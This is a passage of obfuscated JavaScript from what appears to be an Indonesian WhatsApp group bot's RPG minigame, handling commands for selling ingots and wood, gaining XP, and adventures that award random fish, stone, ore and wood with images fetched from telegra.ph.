reply(_0x1eb754(0x576,0x4f1,0x4fa,0x529)+_0x5b2460(-0xd7,-0x15e,-0x1bd,-0x1a4)+_0x1eb754(0x4ea,0x504,0x56a,0x4a4)+enter+enter+(_0x1eb754(0x4ca,0x45e,0x46f,0x47b)+_0x1eb754(0x488,0x480,0x4c6,0x4de)+'*\x20')+bayar+enter+(_0x1eb754(0x462,0x450,0x42a,0x43b)+_0x1eb754(0x5f1,0x580,0x5eb,0x52e))+hasil4+enter+enter+('*Sisa\x20Batu'+_0x1eb754(0x41d,0x489,0x4d5,0x415))+getMiningstone(sender)+enter+(_0x1eb754(0x5f4,0x588,0x4fd,0x5eb)+_0x1eb754(0x4a9,0x489,0x403,0x458))+checkATMuser(sender)+enter+enter+('Proses\x20ber'+_0x1eb754(0x4f6,0x56e,0x4d1,0x607)+_0x5b2460(-0xcb,-0x14f,-0x1ab,-0x19d)+_0x5b2460(-0x258,-0x1e0,-0x277,-0x1f0)+'d88288bak1'+_0x5b2460(-0x1dc,-0x174,-0x196,-0x145))));break;case _0x5b2460(-0x20d,-0x17c,-0x191,-0x1b6):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply('Limit\x20kamu'+_0x5b2460(-0x27b,-0x216,-0x257,-0x1ea)+_0x5b2460(-0x1aa,-0x182,-0x166,-0x15a)+_0x1eb754(0x538,0x4b0,0x43c,0x4b5)+prefix+(_0x1eb754(0x598,0x517,0x550,0x48c)+_0x5b2460(-0x277,-0x1d7,-0x1bb,-0x259)+_0x5b2460(-0xb1,-0x146,-0x145,-0xc5)));if(!isEventon)return reply('Event\x20grub'+_0x5b2460(-0x1b6,-0x132,-0xe4,-0x10f)+_0x1eb754(0x551,0x537,0x4ad,0x50b));bayar=args[_0x1eb754(0x562,0x544,0x582,0x592)]('\x20');const hargaIngot=-0x9c69+-0x1dee+0x1430f,hasil5=bayar*hargaIngot;if(getMiningingot(sender)<=-0x15*-0x167+0x1b66+-0x38d8)return reply(_0x1eb754(0x4e6,0x587,0x5e0,0x57a)+pushname+('\x20ingot\x20kam'+'u\x20belum\x20cu'+_0x5b2460(-0x189,-0x15d,-0xe9,-0x103)+_0x1eb754(0x4f2,0x589,0x53c,0x509)));getMiningingot(sender)>=-0x1b2+0x9*0x337+-0x1b3c&&(jualingot(sender,bayar),addKoinUser(sender,hasil5),await reply(_0x1eb754(0x58f,0x4f1,0x4ef,0x510)+_0x1eb754(0x4de,0x54a,0x5bc,0x4e0)+_0x1eb754(0x567,0x568,0x56e,0x5da)+enter+enter+(_0x1eb754(0x490,0x50d,0x4bf,0x54e)+_0x1eb754(0x54c,0x55d,0x554,0x4d6)+_0x5b2460(-0x23a,-0x21f,-0x289,-0x23b))+bayar+enter+('*Uang\x20dida'+_0x5b2460(-0xeb,-0x128,-0x99,-0x186))+hasil5+enter+enter+(_0x5b2460(-0x1bc,-0x1a6,-0x1dc,-0x208)+_0x1eb754(0x4c6,0x521,0x511,0x4f4))+getMiningingot(sender)+enter+(_0x5b2460(-0xf2,-0x120,-0x11a,-0x142)+_0x5b2460(-0x1cd,-0x21f,-0x182,-0x1a1))+checkATMuser(sender)+enter+enter+(_0x5b2460(-0xb4,-0x11b,-0x162,-0xdc)+_0x5b2460(-0x1b6,-0x13a,-0x180,-0x178)+_0x5b2460(-0xff,-0x14f,-0x184,-0x134)+'embayaran\x20'+_0x1eb754(0x4e5,0x4d0,0x499,0x4af)+_0x5b2460(-0x1c7,-0x174,-0x127,-0x172))));break;case _0x1eb754(0x490,0x4f3,0x4ea,0x49d):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x5b2460(-0x258,-0x1ff,-0x177,-0x29d)+'\x20sudah\x20hab'+_0x1eb754(0x4ea,0x526,0x4b5,0x4f9)+_0x5b2460(-0x245,-0x1f8,-0x17c,-0x1f1)+prefix+('limit\x20untu'+'k\x20mengecek'+_0x1eb754(0x5a7,0x562,0x54c,0x5ec)));if(!isEventon)return reply(_0x5b2460(-0x1db,-0x1bd,-0x150,-0x141)+_0x5b2460(-0x9f,-0x132,-0x152,-0x189)+_0x5b2460(-0x11d,-0x171,-0x18e,-0x16c));bayar=args[_0x5b2460(-0x1e7,-0x164,-0xfe,-0x185)]('\x20');const hargaKayu=-0x6083*0x1+-0x908+0xafdb,hasil6=bayar*hargaKayu;if(getNebangKayu(sender)<=0x50*-0x4a+-0x172b*-0x1+-0x2*0x5)return reply(_0x5b2460(-0x95,-0x121,-0x1aa,-0x19a)+pushname+(_0x5b2460(-0x16d,-0x1a0,-0x238,-0x10c)+'\x20belum\x20cuk'+_0x1eb754(0x4eb,0x54f,0x5dc,0x544)+_0x5b2460(-0x151,-0x19a,-0x152,-0x1bf)));getNebangKayu(sender)>=0x841+0x15db+-0x1e1b&&(jualkayu(sender,bayar),addKoinUser(sender,hasil6),await reply(_0x5b2460(-0x12f,-0x1b7,-0x11d,-0x24f)+_0x5b2460(-0x101,-0x15e,-0xe1,-0x10f)+_0x1eb754(0x602,0x568,0x545,0x512)+enter+enter+('*Jumlah\x20Ka'+_0x5b2460(-0x228,-0x1a9,-0x117,-0x1ae)+'*\x20')+bayar+enter+(_0x1eb754(0x4ea,0x450,0x3b8,0x45c)+_0x5b2460(-0xa1,-0x128,-0x1ac,-0x107))+hasil6+enter+enter+(_0x1eb754(0x4da,0x48f,0x412,0x400)+_0x5b2460(-0x205,-0x20f,-0x2b1,-0x236))+getNebangKayu(sender)+enter+('*Sisa\x20uang'+':*\x20')+checkATMuser(sender)+enter+enter+('Proses\x20ber'+_0x1eb754(0x60c,0x56e,0x505,0x50c)+_0x1eb754(0x52a,0x559,0x523,0x4fe)+'embayaran\x20'+'d88288bak1'+'920kal')));break;case _0x5b2460(-0x154,-0x1f6,-0x1df,-0x251):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x5b2460(-0x162,-0x1ff,-0x1d1,-0x1ff)+'\x20sudah\x20hab'+_0x1eb754(0x4da,0x526,0x4ec,0x568)+_0x5b2460(-0x17b,-0x1f8,-0x231,-0x292)+prefix+(_0x1eb754(0x4f8,0x517,0x59c,0x4f7)+_0x5b2460(-0x19e,-0x1d7,-0x242,-0x18d)+_0x1eb754(0x4e8,0x562,0x5d1,0x556)));if(!isEventon)return reply(_0x5b2460(-0x184,-0x1ca,-0x218,-0x15f)+pushname+(_0x1eb754(0x456,0x45c,0x4cc,0x3be)+_0x1eb754(0x4dd,0x4bc,0x55a,0x4ce)+_0x5b2460(-0x15c,-0x1a1,-0x20d,-0x14b)+'n\x20oleh\x20own'+'er'));if(isOwner){const one=0x5f8b0cbe+0x660635e9+0x854b*-0x108f8;addLevelingXp(sender,one),addLevelingLevel(sender,0x74*-0x2b+-0x2*-0x1049+-0xcb3),reply(_0x1eb754(0x484,0x474,0x41c,0x423)+_0x5b2460(-0x1bb,-0x143,-0xb0,-0x1b5)+_0x1eb754(0x53b,0x4f9,0x4d8,0x556)+_0x1eb754(0x462,0x456,0x46d,0x4b7)+_0x5b2460(-0x116,-0x154,-0x1e0,-0x19b)+one+(_0x5b2460(-0x1f7,-0x1ea,-0x1bd,-0x155)+_0x1eb754(0x513,0x545,0x4b5,0x5a5)));}else setTimeout(()=>{function _0x2568b5(_0x1e339b,_0x25fa9c,_0x19d7c9,_0x4d7a06){return _0x5b2460(_0x1e339b-0x24,_0x4d7a06-0x5de,_0x19d7c9,_0x4d7a06-0xc8);}const _0x190341={'wegSS':function(_0x5e3ec0,_0x36c8e0){return _0x5e3ec0*_0x36c8e0;},'BfVew':function(_0x21a2f4,_0x4af2ba,_0x5e7b55){return _0x21a2f4(_0x4af2ba,_0x5e7b55);}},_0x82b6f7=Math['ceil'](_0x190341[_0x2568b5(0x481,0x424,0x3f1,0x41e)](Math[_0x2568b5(0x33e,0x34a,0x395,0x38a)](),-0x1*-0x10cf+0x1ab6+0xa3*-0x7));_0x190341['BfVew'](addLevelingXp,sender,_0x82b6f7);function _0x1cf03a(_0x2fb0e7,_0x42ff25,_0x4bce77,_0x3796e7){return _0x1eb754(_0x2fb0e7-0x13d,_0x2fb0e7- -0x51a,_0x3796e7,_0x3796e7-0x1e5);}reply(_0x1cf03a(0x4a,-0x37,0x8f,0x82)+_0x1cf03a(-0x5a,-0xbb,0x7,0x38)+pushname+(_0x2568b5(0x310,0x3f2,0x367,0x3a4)+_0x1cf03a(-0x65,-0x105,-0x20,-0xf7))+_0x82b6f7+'Xp*');},0x84c+-0x5*-0x755+0x213d*-0x1),setTimeout(()=>{const _0x1e2736={};_0x1e2736[_0x16f10f(0x4cc,0x4d6,0x520,0x48f)]='Sedang\x20min'+_0x16f10f(0x50a,0x5b9,0x578,0x52d)+_0x2505ad(0x354,0x2fb,0x353,0x3f3)+_0x16f10f(0x4c6,0x532,0x51c,0x4ad)+_0x16f10f(0x4e8,0x533,0x4cf,0x4d4);function _0x2505ad(_0x173be7,_0x16cdbb,_0xe284a0,_0x344519){return _0x1eb754(_0x173be7-0x183,_0xe284a0- -0x132,_0x16cdbb,_0x344519-0x25);}function _0x16f10f(_0x3bfe94,_0x3f03ea,_0x43bfb2,_0x50baa0){return _0x1eb754(_0x3bfe94-0xda,_0x43bfb2- -0x16,_0x50baa0,_0x50baa0-0x160);}const _0x3d000d=_0x1e2736;reply(_0x3d000d[_0x2505ad(0x397,0x487,0x404,0x3c5)]);},0x1*0x199a+-0x19fb+0x1*0x61);await limitAdd(sender,limit);break;case _0x5b2460(-0x231,-0x1b0,-0x20e,-0x1a6):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x1eb754(0x4ac,0x4a9,0x4dd,0x4fe)+_0x5b2460(-0x27a,-0x216,-0x193,-0x29e)+_0x1eb754(0x580,0x526,0x4e5,0x5a1)+'n\x20kirim\x20'+prefix+(_0x5b2460(-0x174,-0x191,-0x22c,-0x198)+_0x5b2460(-0x1c1,-0x1d7,-0x18f,-0x19a)+_0x5b2460(-0xc9,-0x146,-0x160,-0x1d7)));if(!isEventon)return reply('Event\x20grub'+_0x5b2460(-0x1b8,-0x132,-0x14a,-0x134)+'aktifkan');setTimeout(()=>{function _0x29f679(_0x435dd4,_0x31aa9d,_0xbf5f55,_0x1bd4c7){return _0x5b2460(_0x435dd4-0x1f3,_0xbf5f55-0x2a1,_0x31aa9d,_0x1bd4c7-0x63);}function _0x38f4be(_0x11a9b2,_0x16d4f,_0x73ef1d,_0x5b3ac6){return _0x5b2460(_0x11a9b2-0xf4,_0x11a9b2-0x146,_0x5b3ac6,_0x5b3ac6-0xd6);}const _0x245a51={'eysFB':function(_0x3eed35,_0x1df72a){return _0x3eed35*_0x1df72a;},'bXOLI':function(_0x1a81fb,_0x5918a1,_0x1fccc2){return _0x1a81fb(_0x5918a1,_0x1fccc2);},'QfYkM':function(_0x3f3f00,_0x1216f5){return _0x3f3f00(_0x1216f5);}},_0x486e74=Math[_0x38f4be(-0x45,-0xb4,-0x30,-0x9a)](_0x245a51[_0x29f679(0x1de,0x1d4,0x188,0x134)](Math[_0x29f679(-0x32,0x81,0x4d,0xdc)](),-0x44*-0x29+-0x1744+0xc6a));_0x245a51[_0x38f4be(0xf,-0x30,0x31,0x7)](addIkan,sender,_0x486e74),_0x245a51[_0x29f679(0x18e,0x21f,0x18a,0xfb)](reply,_0x29f679(0xe4,0x1a0,0x15d,0xd3)+_0x38f4be(-0x62,-0x45,-0x10,-0x6f)+_0x38f4be(-0xf4,-0x5e,-0x77,-0x140)+_0x29f679(0x126,0x59,0xae,0xd7)+_0x486e74+(_0x29f679(0xe3,0x14f,0x160,0x1bb)+_0x38f4be(-0x25,0x48,-0x86,-0x5b)+'t'));},-0x1421*-0x1+-0x1*-0xe9d+0x1706*-0x1),setTimeout(()=>{function _0x24b9a2(_0x3b86a3,_0xa9aaf7,_0x42becc,_0x4970a0){return _0x1eb754(_0x3b86a3-0x65,_0xa9aaf7- -0x45e,_0x3b86a3,_0x4970a0-0x191);}function _0x1f7d38(_0x1e303a,_0x54328e,_0x2c7c19,_0x2fc081){return _0x1eb754(_0x1e303a-0x3b,_0x54328e- -0x2be,_0x1e303a,_0x2fc081-0x8e);}const _0x59d5de={'bNQtM':function(_0xed324e,_0x4bbe00){return _0xed324e(_0x4bbe00);},'iYuht':_0x24b9a2(0x96,0x88,0x6b,0x9b)+_0x1f7d38(0x21e,0x1c3,0x215,0x1da)+_0x1f7d38(0x217,0x23f,0x289,0x2c1)+_0x1f7d38(0x36f,0x2d4,0x368,0x236)};_0x59d5de['bNQtM'](reply,_0x59d5de['iYuht']);},-0x11*0x17+0x1a*0x170+-0x23d9);break;case _0x1eb754(0x5a1,0x533,0x4cf,0x4dd):case _0x1eb754(0x4c7,0x4e0,0x57a,0x46e):if(!isEventon)return reply('Event\x20grub'+'\x20belum\x20di\x20'+_0x1eb754(0x5af,0x537,0x503,0x55c));var tempsa=args[_0x1eb754(0x5ba,0x544,0x516,0x55c)]('\x20');if(tempsa==_0x5b2460(-0x190,-0x17e,-0x126,-0x12b)+_0x1eb754(0x552,0x581,0x582,0x522)){const _0x36c458={};_0x36c458['method']='get',asu=await getBuffer(_0x5b2460(-0x1f1,-0x21b,-0x2a2,-0x2bb)+_0x1eb754(0x40d,0x4a5,0x53e,0x53a)+_0x1eb754(0x547,0x4fe,0x48d,0x557)+_0x5b2460(-0xaf,-0x13f,-0xd0,-0x1b8)+_0x1eb754(0x4d7,0x4df,0x56c,0x4cb),_0x36c458),setTimeout(()=>{const _0x59d9db={'eRDNs':function(_0x1f3cb2,_0x4b6e4e){return _0x1f3cb2*_0x4b6e4e;},'rsoAE':function(_0x173e51,_0x4d244d){return _0x173e51*_0x4d244d;},'pfeIx':function(_0x3657b0,_0x435b7b,_0x2cf9f1){return _0x3657b0(_0x435b7b,_0x2cf9f1);},'wEZql':function(_0x3315dc,_0x32d3ad,_0x2b11d5){return _0x3315dc(_0x32d3ad,_0x2b11d5);},'gMSEv':_0x461e57(0x4f,-0x37,0x18,-0x14)+_0xc2f341(0x1ea,0x1e1,0x130,0x183)},_0x45598d=Math[_0x461e57(-0x90,0x3b,-0x94,-0x58)](_0x59d9db['eRDNs'](Math[_0xc2f341(0x1c7,0x12a,0x177,0x143)](),0x1*-0x419+-0xdd+-0x14f*-0x4)),_0x8273f9=Math[_0xc2f341(0x21b,0x1dd,0x28e,0x20c)](_0x59d9db['rsoAE'](Math[_0x461e57(-0x11d,-0xbb,-0xe7,-0x121)](),0x488*-0x6+-0x46+0x1b85));function _0x461e57(_0x5a152a,_0x1d102a,_0x284b56,_0x511bdf){return _0x5b2460(_0x5a152a-0x1d2,_0x511bdf-0x133,_0x284b56,_0x511bdf-0xdc);}function _0xc2f341(_0x33aac6,_0x1ab38f,_0x127451,_0x23b311){return _0x1eb754(_0x33aac6-0x1f4,_0x23b311- -0x311,_0x33aac6,_0x23b311-0x1e9);}_0x59d9db[_0xc2f341(0x1f7,0x2f1,0x2dc,0x27f)](addStone,sender,_0x45598d),_0x59d9db[_0x461e57(-0xfe,-0xc5,-0x57,-0xd6)](addIkan,sender,_0x8273f9);const _0x2e383c={};_0x2e383c[_0xc2f341(0x19f,0x223,0x234,0x1c7)+'t']=_0x59d9db[_0xc2f341(0x201,0x14e,0x1ad,0x1ac)];const _0x3d4231={};_0x3d4231[_0x461e57(0x59,-0x70,0x15,-0x8)]=_0x461e57(-0x59,-0x131,-0x14d,-0xd3),_0x3d4231[_0x461e57(-0x198,-0x18f,-0x197,-0xf8)]=_0x2e383c,_0x3d4231[_0x461e57(-0x64,-0xf4,-0x127,-0xd8)]=_0x461e57(-0xc0,-0x3d,-0x8c,-0xcb);const _0x4fed71={};_0x4fed71[_0x461e57(0x84,0x2,0x96,0x0)]=mek,sendButImage(from,_0x461e57(-0x3a,0x6c,0x83,-0x11)+_0x461e57(0xa0,0x77,0x47,-0x2)+enter+enter+(_0x461e57(-0x1d,-0xe1,-0xc8,-0x40)+_0xc2f341(0x10a,0x112,0x178,0x16a))+_0x45598d+(_0xc2f341(0x277,0x1a3,0x2c9,0x23c)+'\x20*')+_0x8273f9+_0xc2f341(0x1da,0x1ca,0x20e,0x213)+enter+enter+(_0x461e57(-0x134,-0x70,-0x44,-0xc7)+_0xc2f341(0x16e,0x1c9,0x15c,0x171)+'engan\x20cara'+'\x20ketik\x20')+prefix+_0x461e57(-0xe9,-0x36,-0xce,-0x6f),botname+_0xc2f341(0x26c,0x23e,0x22f,0x271)+ownername,asu,[_0x3d4231],_0x4fed71);},-0x1fd*0x12+-0x1a0a+-0x6*-0xc42),setTimeout(()=>{const _0x4dec9c={};function _0x3e16ad(_0x2ea05d,_0x27fb46,_0x59a3ec,_0x4489f1){return _0x1eb754(_0x2ea05d-0x1b0,_0x2ea05d- -0x1ad,_0x4489f1,_0x4489f1-0xfe);}_0x4dec9c[_0xa4141(0x1ea,0x25b,0x202,0x208)]=_0xa4141(0x216,0x1b3,0x297,0x282)+_0x3e16ad(0x2e8,0x31f,0x334,0x2bb)+_0x3e16ad(0x304,0x351,0x32c,0x311)+_0xa4141(0x1db,0x237,0x273,0x1a2);function _0xa4141(_0x4b439a,_0x48449b,_0x21ffa6,_0x17cdda){return _0x1eb754(_0x4b439a-0x1f2,_0x4b439a- -0x350,_0x21ffa6,_0x17cdda-0xfa);}const _0x24d79f=_0x4dec9c;reply(_0x24d79f[_0xa4141(0x1ea,0x268,0x15b,0x26c)]);},-0x1ecc+-0x16*-0x3d+0x198e);}else{if(tempsa===_0x5b2460(-0x1b1,-0x12c,-0x8c,-0x1a0)+'oods'){const _0x939ea={};_0x939ea[_0x5b2460(-0x2d2,-0x257,-0x22c,-0x1d7)]=_0x1eb754(0x3f1,0x45a,0x418,0x3e8),gos=await getBuffer(_0x1eb754(0x47f,0x48d,0x42a,0x465)+_0x1eb754(0x41d,0x4a5,0x42c,0x456)+_0x5b2460(-0x19e,-0x136,-0x94,-0xe8)+'dc9f97d658'+_0x5b2460(-0x2bc,-0x245,-0x1b9,-0x1e4),_0x939ea),setTimeout(()=>{const _0x234d15={'zakfW':function(_0x14058c,_0x56293d,_0x4bd55a,_0x45f8de,_0x3bc5cf,_0x49078a,_0x2bbe06){return _0x14058c(_0x56293d,_0x4bd55a,_0x45f8de,_0x3bc5cf,_0x49078a,_0x2bbe06);},'dODUa':'My\x20Invento'+'ry\x20🗃️','hTLRZ':_0x26d8a2(0x363,0x40c,0x390,0x3b3)},_0x2320a6=Math[_0x4a8dd1(0x2d7,0x34c,0x2db,0x33b)](Math[_0x4a8dd1(0x20e,0x1c5,0x223,0x1de)]()*(-0x106c*0x1+0x4*0x4bf+-0x222)),_0x7ad48=Math['ceil'](Math['random']()*(0x6bd+-0x3*0xaa4+0x1943));addStone(sender,_0x2320a6);function _0x26d8a2(_0x3fb290,_0x1bd83d,_0x2497fc,_0x5bf9f5){return _0x5b2460(_0x3fb290-0xca,_0x5bf9f5-0x5b1,_0x1bd83d,_0x5bf9f5-0x15b);}function _0x4a8dd1(_0x43584f,_0x5e68e3,_0x46c75d,_0x33d3e3){return _0x5b2460(_0x43584f-0x168,_0x43584f-0x462,_0x46c75d,_0x33d3e3-0x11a);}addKayu(sender,_0x7ad48);const _0x5dc65c={};_0x5dc65c['quoted']=mek,_0x234d15[_0x26d8a2(0x43f,0x4e5,0x432,0x481)](sendButImage,from,_0x26d8a2(0x427,0x422,0x426,0x46d)+'ation\x20🎊*'+enter+enter+(_0x26d8a2(0x453,0x41d,0x418,0x43e)+'patkan\x20*')+_0x2320a6+(_0x4a8dd1(0x307,0x354,0x30f,0x2e2)+'\x20*')+_0x7ad48+_0x26d8a2(0x452,0x4ba,0x410,0x493)+enter+enter+(_0x26d8a2(0x42e,0x3f4,0x400,0x3b7)+_0x26d8a2(0x36b,0x2f4,0x3e5,0x38b)+_0x4a8dd1(0x2c3,0x2ea,0x2a8,0x22d)+_0x4a8dd1(0x290,0x218,0x25b,0x2df))+prefix+'inventory',botname+'™©\x20|\x20By\x20'+ownername,gos,[{'buttonId':_0x26d8a2(0x38a,0x437,0x404,0x3ab),'buttonText':{'displayText':_0x234d15[_0x26d8a2(0x441,0x3a6,0x4a0,0x42e)]},'type':_0x234d15[_0x4a8dd1(0x2b6,0x34d,0x297,0x2c5)]}],_0x5dc65c);},0x23ae+0x252d+-0x3d23),setTimeout(()=>{const _0x28bc99={'hPnSO':function(_0x25b021,_0x27b755){return _0x25b021(_0x27b755);}};function _0x3d5990(_0x1e3e11,_0x331b39,_0x222168,_0x4d908b){return _0x1eb754(_0x1e3e11-0x1ed,_0x4d908b- -0x3ce,_0x222168,_0x4d908b-0xe9);}function _0x111c3c(_0xf31157,_0x18f49c,_0x2c426,_0x5ed0a9){return _0x5b2460(_0xf31157-0xbb,_0x2c426-0x3cd,_0x5ed0a9,_0x5ed0a9-0xd9);}_0x28bc99['hPnSO'](reply,_0x3d5990(0x155,0x1a2,0x1d1,0x198)+_0x3d5990(0x2d,0x6b,0x43,0xc7)+'\x20silahkan\x20'+_0x111c3c(0x2c5,0x1d8,0x250,0x1fe));},0x988+-0x19*0x146+0x164e);}else{if(tempsa===_0x1eb754(0x4af,0x47e,0x461,0x4eb)+'a'){const _0x3c877f={};_0x3c877f['method']='get',seae=await getBuffer('https://te'+'legra.ph/f'+_0x5b2460(-0x15c,-0x15c,-0x114,-0x1f9)+_0x5b2460(-0x1e4,-0x233,-0x236,-0x1a3)+_0x1eb754(0x502,0x498,0x4e3,0x51e),_0x3c877f),setTimeout(()=>{function _0x2abb9e(_0x5c437a,_0xae4a7,_0x1ea71f,_0x1baf64){return _0x5b2460(_0x5c437a-0x1bd,_0x1ea71f-0x41c,_0x5c437a,_0x1baf64-0x1eb);}function _0x133e4e(_0xdb55a2,_0x38fe9e,_0x45457a,_0x429e88){return _0x5b2460(_0xdb55a2-0x6e,_0xdb55a2-0x479,_0x38fe9e,_0x429e88-0xf0);}const _0x424cf4={'zHiSb':function(_0x1ef7c3,_0x4771a4){return _0x1ef7c3*_0x4771a4;},'MHJLM':function(_0x3b7453,_0x6a0764,_0x39a7ff,_0x298e57,_0x364b6a,_0x2a9a8c,_0x49a9d2){return _0x3b7453(_0x6a0764,_0x39a7ff,_0x298e57,_0x364b6a,_0x2a9a8c,_0x49a9d2);},'Hzoze':_0x2abb9e(0x20c,0x2a2,0x21e,0x26c)},_0x18a504=Math[_0x2abb9e(0x2b4,0x2aa,0x291,0x2e6)](_0x424cf4[_0x2abb9e(0x285,0x22a,0x1f3,0x203)](Math[_0x133e4e(0x225,0x26f,0x24e,0x283)](),0x9*-0x3c4+-0xec5+0x30ea));addIkan(sender,_0x18a504);const _0x1a091e={};_0x1a091e[_0x133e4e(0x2a9,0x240,0x2d1,0x302)+'t']='My\x20Invento'+_0x2abb9e(0x194,0x266,0x208,0x20d);const _0x5daca7={};_0x5daca7['quoted']=mek,_0x424cf4[_0x133e4e(0x2c0,0x324,0x34e,0x2e7)](sendButImage,from,'*Congratul'+_0x133e4e(0x344,0x2ce,0x2d3,0x31b)+enter+enter+(_0x133e4e(0x306,0x2dc,0x36a,0x312)+'patkan\x20*')+_0x18a504+_0x2abb9e(0x2ee,0x27d,0x298,0x286)+enter+enter+(_0x2abb9e(0x1fb,0x298,0x222,0x244)+_0x2abb9e(0x1ad,0x233,0x1f6,0x161)+_0x133e4e(0x2da,0x376,0x241,0x260)+_0x2abb9e(0x1fe,0x2d4,0x24a,0x28d))+prefix+_0x133e4e(0x2d7,0x256,0x24e,0x33b),botname+_0x133e4e(0x353,0x3d9,0x33d,0x3e8)+ownername,seae,[{'buttonId':_0x133e4e(0x273,0x230,0x272,0x2ff),'buttonText':_0x1a091e,'type':_0x424cf4[_0x133e4e(0x2dc,0x33e,0x312,0x2a0)]}],_0x5daca7);},-0x1044+0x44*-0x89+-0x338*-0x14),setTimeout(()=>{function _0x44cb84(_0x20dbd8,_0x1adbdd,_0x480f8e,_0x2996ae){return _0x5b2460(_0x20dbd8-0x169,_0x480f8e- -0x40,_0x20dbd8,_0x2996ae-0xd5);}const _0x12dce7={'loqkJ':function(_0x2aec4f,_0xdaeed0){return _0x2aec4f(_0xdaeed0);},'lgJGQ':_0x33fa9a(0x5ff,0x5e4,0x542,0x560)+'petualang,'+'\x20silahkan\x20'+_0x44cb84(-0x20e,-0x252,-0x1bd,-0x24b)};function _0x33fa9a(_0x2bc34c,_0x1d6422,_0x18295b,_0x15fff2){return _0x5b2460(_0x2bc34c-0x4,_0x15fff2-0x6a2,_0x18295b,_0x15fff2-0xfa);}_0x12dce7[_0x33fa9a(0x570,0x46d,0x4f2,0x4d7)](reply,_0x12dce7['lgJGQ']);},0x1*-0x24b6+-0x4c*0x13+0x8b*0x4e);}else{if(tempsa==='limingstal'+_0x1eb754(0x479,0x4d5,0x4d4,0x44e)+'s'){const _0x13198d={};_0x13198d[_0x1eb754(0x420,0x451,0x459,0x498)]=_0x1eb754(0x4f3,0x45a,0x4b8,0x4ef),seoe=await getBuffer('https://te'+'legra.ph/f'+_0x5b2460(-0x24e,-0x24d,-0x25d,-0x254)+'f95c31af10'+_0x5b2460(-0x1fd,-0x1f4,-0x23f,-0x281),_0x13198d),setTimeout(()=>{const _0x54d6b6={'FuKSw':function(_0x1be180,_0x586e73){return _0x1be180*_0x586e73;},'nwbUC':function(_0x4975e4,_0x1bf1ad,_0x31dd5b){return _0x4975e4(_0x1bf1ad,_0x31dd5b);},'KNpzG':function(_0x26602a,_0xb1d545,_0x3e7bd3){return _0x26602a(_0xb1d545,_0x3e7bd3);},'pmHLP':function(_0x2e7097,_0x1ec1d4,_0x8341e9,_0x4e8e19,_0x23d2c7,_0xc21857,_0x492c8a){return _0x2e7097(_0x1ec1d4,_0x8341e9,_0x4e8e19,_0x23d2c7,_0xc21857,_0x492c8a);},'SwpBa':'My\x20Invento'+_0x9e6fc2(-0xb5,-0x16,-0x3,0x3e),'LDtoD':_0x15a29b(-0x161,-0x109,-0x93,-0xfa)},_0x37d7ef=Math[_0x15a29b(-0x62,0xe,-0xe3,-0x87)](_0x54d6b6[_0x9e6fc2(0xfa,0x62,0x46,0xda)](Math[_0x9e6fc2(-0xab,-0x56,-0xd,0x3e)](),0xa04+-0x2*-0xed+-0x4*0x2eb)),_0x51b240=Math[_0x9e6fc2(-0x27,0x73,-0x1b,0x3)](Math['random']()*(0x1dc2+-0x1*-0x10d7+-0x2e49));function _0x15a29b(_0x2f233c,_0x22b301,_0xa3908a,_0x203c18){return _0x1eb754(_0x2f233c-0x116,_0x203c18- -0x5a4,_0x22b301,_0x203c18-0x1ac);}_0x54d6b6[_0x9e6fc2(0x80,0xd4,0x88,0xe6)](addOre,sender,_0x37d7ef),_0x54d6b6['KNpzG'](addStone,sender,_0x51b240);const _0x52b85d={};function _0x9e6fc2(_0x263ce5,_0x530de3,_0xbb8b15,_0x4c5998){return _0x1eb754(_0x263ce5-0x1a8,_0x530de3- -0x4aa,_0x4c5998,_0x4c5998-0x172);}_0x52b85d[_0x9e6fc2(0xa9,0xcb,0x11a,0x7e)]=mek,_0x54d6b6['pmHLP'](sendButImage,from,_0x15a29b(-0x3,-0x6d,-0xc3,-0x40)+_0x15a29b(-0x3b,0x66,0x3e,-0x31)+enter+enter+(_0x15a29b(0x25,-0x106,-0x2a,-0x6f)+_0x9e6fc2(-0x38,-0x2f,-0x35,0x68))+_0x37d7ef+(_0x15a29b(-0x7a,-0x25,0x12,-0x61)+'re\x20dan\x20')+_0x51b240+_0x15a29b(-0x184,-0xcb,-0x1a4,-0x11a)+enter+enter+('Cek\x20invent'+_0x15a29b(-0x97,-0x10f,-0x1b4,-0x122)+'engan\x20cara'+_0x9e6fc2(-0x46,0x2c,-0x3c,0x80))+prefix+_0x15a29b(-0x43,-0x13c,-0x68,-0x9e),botname+_0x9e6fc2(0x78,0xd8,0x162,0x4d)+ownername,seoe,[{'buttonId':_0x9e6fc2(-0x64,-0x8,0x43,0x51),'buttonText':{'displayText':_0x54d6b6[_0x15a29b(-0xd7,-0x9d,-0xd3,-0xe0)]},'type':_0x54d6b6[_0x9e6fc2(-0x5a,-0x41,-0xa3,0x2b)]}],_0x52b85d);},0x662+0x16*-0x1a8+0x29c6),setTimeout(()=>{function _0x28f2c5(_0x4e891d,_0x33982d,_0x532b3e,_0x5f4d02){return _0x5b2460(_0x4e891d-0x151,_0x532b3e-0xfa,_0x5f4d02,_0x5f4d02-0x5e);}const _0x469ee0={};_0x469ee0[_0x5556a7(0x24d,0x1c7,0x1c5,0x237)]=_0x28f2c5(0x52,-0x4a,-0x48,-0x25)+'petualang,'+_0x5556a7(0x293,0x26c,0x22c,0x2c7)+_0x5556a7(0x30d,0x276,0x28a,0x334);const _0x217a98=_0x469ee0;function _0x5556a7(_0xea2570,_0x3b6d0a,_0x2ca283,_0x49efb1){return _0x1eb754(_0xea2570-0x71,_0xea2570- -0x21e,_0x2ca283,_0x49efb1-0x166);}reply(_0x217a98[_0x28f2c5(-0x1df,-0x12c,-0x143,-0x1d5)]);},0xd5d*-0x2+0x9b3+0x1107*0x1);}else{if(tempsa===_0x1eb754(0x468,0x4ca,0x449,0x434)+'tain'){const _0xf15108={};_0xf15108[_0x5b2460(-0x23e,-0x257,-0x227,-0x27a)]=_0x5b2460(-0x296,-0x24e,-0x24c,-0x28f),seye=await getBuffer(_0x1eb754(0x50a,0x48d,0x455,0x42c)+_0x5b2460(-0x2a3,-0x203,-0x1f2,-0x1e7)+_0x5b2460(-0x161,-0x177,-0x1e7,-0x164)+'d07dd22294'+_0x5b2460(-0x2d9,-0x239,-0x216,-0x298),_0xf15108),setTimeout(()=>{const _0x295fe8={'Xsejl':function(_0x51e645,_0x5a5190,_0x187872){return 